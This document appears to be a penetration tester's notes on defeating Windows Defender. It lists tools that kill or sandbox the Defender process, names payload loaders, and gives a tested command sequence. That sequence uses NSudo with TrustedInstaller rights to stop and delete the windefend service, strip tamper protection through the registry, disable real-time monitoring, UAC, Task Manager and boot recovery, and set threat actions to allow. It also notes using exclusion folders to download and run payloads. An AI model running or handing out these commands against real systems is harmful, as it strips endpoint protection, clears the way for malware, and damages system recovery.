
# Defender Attacks

## Defeat-Defender-V1.2.0

Github: https://github.com/swagkarna/Defeat-Defender-V1.2.0

Theory: Its is a Powerful batch script to permanently disable all windows defender protection features and even bypass tamper protection. Tamper protection/Real Time Protection is bypassed by using NSudo to execute commands without trigerring Windows Defender. 

It is possible to do this manually with NSudo.exe and powershell with the following commands: https://github.com/swagkarna/Defeat-Defender-V1.2.0/blob/main/Defeat-Defender.bat#L35

Implications and features disabled: Virus and Threat protection is completely disabled after reboot along with: 
-   PUAProtection
-   Automatic Sample Submission
-   Windows FireWall
-   Windows Smart Screen(Permanently)
-   Disable Quickscan
-   Add exe file to exclusions in defender settings
-   Disable Defender Notification 
-   Disable UAC(Reboot Required)
-   Disable Ransomware Protection
-   Disable TaskManager
-   Disable registry etc..

Usage: Unzip the archive --> Run ".\Defeat-Defender.bat"  as admin

## Stop Defender

Github: https://github.com/lab52io/StopDefender

Blog: https://www.securityartwork.es/2021/09/27/trustedinstaller-parando-windows-defender/

Theory: Get privileges to stop the Windows Defender Service programmatically by creating and impersonating a new token using TrustedInstaller and Windefend service accounts.

Implications: Defender doesn't come back to life until one of its tasks is executed (about 24h)/rebooted.

Usage: Run ".\StopDefender.exe" as admin


## unDefender

Github: https://github.com/APTortellini/unDefender

Blog: https://aptw.tf/2021/08/21/killing-defender.html

Theory: With Administrator level privileges and without interacting with the GUI, it’s possible to prevent Defender from doing its job while keeping it alive and without disabling tamper protection by redirecting the "\Device\BootDevice" NT symbolic link which is part of the NT path from where Defender’s WdFilter driver binary is loaded. This can also be used to make Defender load an arbitrary driver, loaded again by its Tamper Protection feature in place of the original WdFilter.sys, rendering it effectively useless.

Usage: Run "\.unDefender.exe" with "legit.sys" as admin in current directory.

## KillDefender

Github: https://github.com/pwn1sher/KillDefender

GithubBOF: https://github.com/Cerbersec/KillDefenderBOF

Theory: It is a C++ POC to make defender useless by removing its token privileges and lowering the token integrity.

Implications: Defender doesn't come back to life until one of its tasks is executed (about 24h)/rebooted.

Usage: Run ".\KillDefender.exe" as as admin

## SandboxDefender

Github: https://github.com/plackyhacker/SandboxDefender

Blog: https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/

Theory: Works similar to above discussed technique. In short it works by:
-   Enable the SeDubgPrivilege in our process security token.
-   Get a handle to Defender using PROCESS_QUERY_LIMITED_INFORMATION.
-   Get a handle to the Defender token using TOKEN_ALL_ACCESS.
-   Disable all privileges in the token using SetPrivilege
-   Set the Defender token Integrity level to Untrusted.

Implications: Defender doesn't come back to life until one of its tasks is executed (about 24h)/rebooted.

Usage: Run ".\SandboxDefender.exe" as admin

## windows-defender-remover

Github: https://github.com/jbara2002/windows-defender-remover

Theroy: This application is removing / disables Windows Defender , including the Windows Security App, Windows Virtualization-Based Security (VBS) , Windows Smart-Screen, Windows Security Services , Windows Web-Threat Service and Windowa File Virtualization (UAC) and Microsoft Defender App Guard.




# Loaders and Packers


## NetLoader by Flangvikk

## ExecuteAssembly

https://github.com/med0x2e/ExecuteAssembly

## ExecRemoteAssembly

https://github.com/D1rkMtr/ExecRemoteAssembly

## FuckThatPacker

https://github.com/Unknow101/FuckThatPacker


## RefleXXion

https://github.com/hlldz/RefleXXion


## Stracciatella

https://github.com/mgeeky/Stracciatella



## Twitter method

https://twitter.com/1kwpeter/status/1397816101455765504?lang=en




# Server 2022 Working Methods

## Uninstall Windows Defender using Powershell

- CMD as admin: "Uninstall-WindowsFeature -Name Windows-Defender"

- Reboot after.

## Using Defender Exceptions

- Create Defender Folder/Extension Exceptions or enumerate such exceptions to download and execute on-disk payloads from.


# Research

## Local group policy



## Regedit 

- Not possible to change TamperProtection/TamperProtectionSource values from regedit

![](Pasted%20image%2020221123130723.png)

3. System Shell

![](Pasted%20image%2020221123134959.png)

![](Pasted%20image%2020221123135525.png)

After adding rights for FullControl for student501 it still dosent work: 

![](Pasted%20image%2020221123140052.png)

NSudo can be used to to run Command Prompt with TrustedInstaller, enable all privileges and the default Integrity Level.

![](Pasted%20image%2020221123144401.png)

`.\NSudoLC.exe -U:T -ShowWindowMode:Hide reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /f`

![](Pasted%20image%2020221123144136.png)

Commands:

```
icacls "C:\Windows\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f

reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f

sc stop windefend

sc delete windefend

bcdedit /set {default} recoveryenabled No

bcdedit /set {default} bootstatuspolicy ignoreallfailures

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

powershell.exe -command "Set-MpPreference -PUAProtection disable"

powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"

powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f

# Disable realtime monitoring altogether
powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"

# Only disables scanning for downloaded files or attachments
powershell.exe -c "Set-MpPreference -DisableIOAVProtection $true"

```

### Working:

### Using NSudo

Use NSudo to create a cmd.exe process with TrustedInstaller (T) / System (S) enabling all privileges (E): `.\NSudoLC.exe -U:T -P:E cmd.exe`

Stop the defender service in the new spawned elevated prompt (It is also possible to delete the service using "sc delete"): `sc stop windefend` 

![](Pasted%20image%2020221123152156.png)

Defender can be bypassed to execute payloads and re-enabled back using the "sc start" command.

Now to bypass Tamper Protection, the registry key is not allowed to be altered until the windefend service is stopped. We can continue after stopping the target windefend service as above to disable tamper protection using registry:

![](Pasted%20image%2020221123152606.png)

Next restart the service to find tamper protection disabled:

![](Pasted%20image%2020221123152807.png)

Now disable AV as normal using the following commands:

```
# Disable realtime monitoring altogether
powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"

# Only disables scanning for downloaded files or attachments
powershell.exe -c "Set-MpPreference -DisableIOAVProtection $true"
```

Summary of attack:

![](Pasted%20image%2020221123153437.png)